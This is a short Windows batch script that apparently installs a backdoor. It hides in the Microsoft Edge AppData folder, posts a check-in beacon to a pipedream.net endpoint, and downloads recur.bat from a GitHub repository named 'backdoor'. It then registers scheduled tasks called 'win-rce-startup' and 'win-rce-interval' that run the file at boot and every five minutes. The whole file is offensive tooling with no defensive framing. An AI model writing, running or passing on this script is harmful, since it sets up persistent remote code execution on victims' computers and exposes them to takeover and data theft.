cd C:\Users\%username%\Appdata\Local\Microsoft\Edge
curl -d "{'event':'initalization'}" https://eojlk5hggkgar9y.m.pipedream.net
curl -O recur.bat "https://raw.githubusercontent.com/Wolfoverflow/backdoor/main/recur.bat" 
schtasks /CREATE /TN "win-rce-startup" /TR "C:\Users\%username%\Appdata\Local\Microsoft\Edge\recur.bat" /SC ONSTART
schtasks /CREATE /TN "win-rce-interval" /TR "C:\Users\%username%\Appdata\Local\Microsoft\Edge\recur.bat" /SC MINUTE /MO 5
